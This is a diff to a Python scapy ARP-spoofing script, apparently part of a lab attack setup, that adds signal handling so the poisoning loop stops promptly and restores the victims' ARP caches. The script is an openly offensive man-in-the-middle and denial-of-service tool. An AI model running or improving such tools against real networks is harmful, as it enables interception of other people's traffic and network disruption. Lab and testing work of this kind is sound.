@@ -17,10 +17,24 @@ Usage:
 """
 import argparse
 import os
+import signal
 import sys
 import time
 
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp
+
+# Set when a stop signal (SIGINT/SIGTERM) is received. We use a flag rather than
+# relying on KeyboardInterrupt because when this script is launched as a shell
+# BACKGROUND job (e.g. from run_attack.sh), the shell sets SIGINT/SIGQUIT to
+# "ignored" for the child (POSIX async-list behavior). Explicitly installing our
+# own handlers below overrides that so Ctrl+C / kill -TERM actually reach us and
+# the ARP caches get restored instead of the parent hanging on `wait`.
+_stop = False
+
+
+def _request_stop(signum, _frame):
+    global _stop
+    _stop = True
 
 
 def get_mac(ip: str, iface: str, retries: int = 5):
@@ -98,14 +112,29 @@ def main() -> int:
     else:
         print("[arp] IP forwarding NOT enabled (--no-forward): this is a DoS, not a MITM")
 
-    print(f"[arp] poisoning every {args.interval:.1f}s. Press Ctrl+C to stop and restore.")
+    # Override any inherited "ignore SIGINT" disposition (see note at top) so we
+    # respond to both Ctrl+C (SIGINT) and `kill -TERM` from the parent script.
+    signal.signal(signal.SIGINT, _request_stop)
+    signal.signal(signal.SIGTERM, _request_stop)
+
+    print(f"[arp] poisoning every {args.interval:.1f}s. Ctrl+C (or SIGTERM) to stop and restore.")
     try:
-        while True:
+        while not _stop:
             poison(args.client, client_mac, args.server, server_mac, args.iface, my_mac)
-            time.sleep(args.interval)
-    except KeyboardInterrupt:
-        print("\n[arp] stopping ...")
+            # Sleep in small slices so a stop request is noticed within ~0.1s
+            # instead of up to --interval seconds.
+            slept = 0.0
+            while slept < args.interval and not _stop:
+                time.sleep(min(0.1, args.interval - slept))
+                slept += 0.1
     finally:
+        # Guarantee the restore runs to completion: ignore further stop signals
+        # while we send the corrective ARP replies, so a second Ctrl+C can't
+        # abort the restore half-way and leave the victims poisoned. (Only
+        # SIGKILL from the parent's force-quit can interrupt this, by design.)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+        signal.signal(signal.SIGTERM, signal.SIG_IGN)
+        print("\n[arp] stopping ...")
         restore(args.client, client_mac, args.server, server_mac, args.iface, my_mac)
     return 0
 
